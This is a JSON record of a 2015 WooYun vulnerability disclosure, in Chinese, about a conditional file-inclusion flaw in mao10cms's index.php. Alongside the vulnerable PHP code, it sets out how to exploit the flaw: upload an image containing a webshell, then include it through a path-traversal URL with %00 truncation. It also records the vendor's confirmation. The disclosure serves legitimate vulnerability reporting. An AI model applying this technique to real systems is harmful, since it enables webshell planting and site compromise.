{"id": 84136, "wybug_id": "wooyun-2015-0145711", "wybug_title": "mao10cms文件包含漏洞（有条件）", "wybug_corp": "mao10.com", "wybug_author": "pang0lin", "wybug_date": "2015-10-12 14:04", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "文件包含", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含漏洞", "文件包含漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： mao10cms有条件的文件包含漏洞 详细说明：  1.mao10cms采用了mysqli的数据库操作方式，而且所有的数据库操作都是参数绑定的，蛋疼。只有来看一个有条件的文件包含漏洞了。漏洞文件index.php\n<?phprequire \"do/functions.php\";$conn = mysql_connect($mysqli['host'],$mysqli['username'],$mysqli['password']);if($conn) :\t$mod = strtolower(isset($_GET['m']) ? $_GET['m'] : \"index\");\t$act = strtolower(isset($_GET['a']) ? $_GET['a'] : \"index\");\trequire \"mod/{$mod}.php\";\t$app = New Maoo();\t$app->$act();else : \trequire \"gdb.php\";endif;\n2.这里的$_GET['m']直接传入了require，二没有经过过滤，那么就可以考虑截断的文件包含。两种方式，一种是%00，一种是超长文件。两种都有条件，大家懂得。这里以%00为例，注册一个用户，上传一张图片马\n\n然后下面可以获取到图片的路径，直接进行包含**.**.**.**:8080/mao10cms/?m=../upload/20151010/20151010024141_37891.jpg%00\n\n。应该不用说也知道这是一个马了吧   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 pang0lin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-12 14:25 厂商回复： 感谢指正 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}